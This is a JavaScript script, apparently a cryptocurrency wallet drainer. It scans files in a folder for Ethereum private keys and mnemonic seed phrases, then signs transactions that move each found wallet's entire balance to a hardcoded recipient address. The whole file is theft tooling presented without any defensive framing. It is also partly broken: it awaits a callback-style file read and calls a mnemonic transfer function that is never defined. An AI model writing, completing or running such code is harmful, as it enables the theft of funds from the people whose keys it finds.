// Import required modules
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const { Wallet, providers, ethers } = require('ethers');
const colors = require('colors');
const bip39 = require('bip39');
const path = require('path');
const hdkey = require('ethereumjs-wallet').hdkey;
const fg = require('fast-glob');

// Constants
const ethereumRecipientAddress = '0x1052AaFf72E2c53dB7eF35580A6034802EB902d4';
const ethereumRpcUrl = 'http://localhost:8545';
const folderPath = '/linux/ubuntu/keys-Finder/'; 

// Function to check if a given string is a valid Ethereum private key
const isValidPrivateKey = (privateKey) => {
  const formattedPrivateKey = privateKey.toLowerCase();
  return (
    ethers.utils.isHexString(formattedPrivateKey) ||
    /[0-9a-fA-F]{64}/g.test(formattedPrivateKey)
  );
};

// Function to check if a given string is a valid Ethereum mnemonic
const isValidMnemonic = (mnemonic) => {
  return bip39.validateMnemonic(mnemonic);
};

// Function to process a file and extract private keys and mnemonics
async function processFile(filePath) {
  const fileContent = await fs.readFile(filePath, 'utf8');
  const lines = fileContent.split('\n');

  for (const line of lines) {
    console.log(`Processing line: ${line}`);

    // Extract private keys and mnemonics from the line
    const privateKeyRegex = /[0-9a-fA-F]{64}/g;
    const mnemonicRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b)+/g;
    const sentenceRegex = /(?:[A-Fa-f0-9]{64}(?![A-Fa-f0-9]))|(?:S[A-Za-z2-7]{55}(?![A-Za-z2-7]))/g;
    const mnemonicSubsetRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b){11,23}/g;

    const privateKeys = line.match(privateKeyRegex);
    const mnemonics = line.match(mnemonicRegex);
    const sentences = line.match(sentenceRegex);
    const mnemonicSubsets = line.match(mnemonicSubsetRegex);

    // Process the extracted private keys and mnemonics
    if (privateKeys) {
      for (const privateKey of privateKeys) {
        if (isValidPrivateKey(privateKey)) {
          console.log(`Found valid Ethereum private key: ${privateKey}`);
          await transferFundsEthereum(privateKey);
        }
      }
    }

    if (mnemonics) {
      for (const mnemonic of mnemonics) {
        if (isValidMnemonic(mnemonic)) {
          console.log(`Found valid Ethereum mnemonic: ${mnemonic}`);
          await transferFundsEthereumFromMnemonic(mnemonic);
        }
      }
    }

    // Process sentences to find 12-24 word mnemonic seed phrases
    if (sentences) {
      for (const sentence of sentences) {
        const words = sentence.split(' ');
        for (let i = 0; i < words.length - 11; i++) {
          const mnemonicSubset = words.slice(i, i + 12).join(' ');
          if (isValidMnemonic(mnemonicSubset)) {
            console.log(`Found valid Ethereum mnemonic: ${mnemonicSubset}`);
            await transferFundsEthereumFromMnemonic(mnemonicSubset);
          }
        }
      }
    }

    // Process mnemonic subsets within sentences
    if (mnemonicSubsets) {
      for (const mnemonicSubset of mnemonicSubsets) {
        if (isValidMnemonic(mnemonicSubset)) {
          console.log(`Found valid Ethereum mnemonic in sentence: ${mnemonicSubset}`);
          await transferFundsEthereumFromMnemonic(mnemonicSubset);
        }
      }
    }
  }
}

// Function to transfer funds on Ethereum using a private key
// Function to transfer funds on Ethereum using a private key
async function transferFundsEthereum(privateKey) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(ethereumRpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    const balance = await wallet.getBalance();
    const balanceEther = ethers.utils.formatEther(balance);
    console.log(`Balance in Ethereum wallet: ${balanceEther} ETH`);

    if (balance.isZero()) {
      console.log('Skipping transaction - no balance in Ethereum wallet');
      return;
    }

    const transactionFee = await wallet.provider.getGasPrice();
    const gasLimit = 21000; // adjust the gas limit according to your needs
    const txCount = await wallet.getTransactionCount();
    const tx = {
      from: wallet.address,
      to: ethereumRecipientAddress,
      value: balance,
      gas: gasLimit,
      gasPrice: transactionFee,
      nonce: txCount,
    };

    const signedTx = await wallet.signTransaction(tx);
    const txHash = await provider.sendTransaction(signedTx.rawTransaction);

    console.log(`Transaction sent: ${txHash}`);
  } catch (error) {
    console.error(`Error transferring funds: ${error}`);
  }
}